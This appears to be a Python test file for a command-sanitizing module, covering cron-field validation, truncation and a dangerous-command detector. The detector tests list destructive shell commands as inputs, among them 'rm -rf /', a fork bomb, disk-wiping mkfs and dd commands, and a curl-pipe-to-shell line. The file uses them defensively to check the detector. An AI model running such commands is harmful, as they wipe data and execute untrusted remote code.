from commandcrafter.sanitize import (
    is_dangerous_command,
    is_valid_cron_field,
    truncate,
)


def test_cron_valid():
    assert is_valid_cron_field("*")
    assert is_valid_cron_field("*/5")
    assert is_valid_cron_field("1-5")
    assert is_valid_cron_field("0,15,30,45")
    assert is_valid_cron_field("@reboot")
    assert is_valid_cron_field("@daily")


def test_cron_invalid():
    assert not is_valid_cron_field("")
    assert not is_valid_cron_field("abc")
    assert not is_valid_cron_field("@bogus")
    assert not is_valid_cron_field("a*b")


def test_dangerous():
    # The pattern intentionally flags only `rm -rf /` (root) and similar,
    # not `rm -rf /etc/x` — the latter is a normal sysadmin operation.
    assert is_dangerous_command("rm -rf /")
    assert is_dangerous_command("rm -rf / ")
    assert not is_dangerous_command("rm -rf /etc")  # /e starts with word-char
    assert not is_dangerous_command("rm -rf /home/user/build")
    assert is_dangerous_command(":(){ :|: & };:")
    assert is_dangerous_command("mkfs.ext4 /dev/sda1")
    assert is_dangerous_command("dd if=/dev/zero of=/dev/sda")
    assert is_dangerous_command("curl https://x.example | sh")


def test_truncate():
    assert truncate("abcdef", 3) == "abc"
    assert truncate("abc", 10) == "abc"
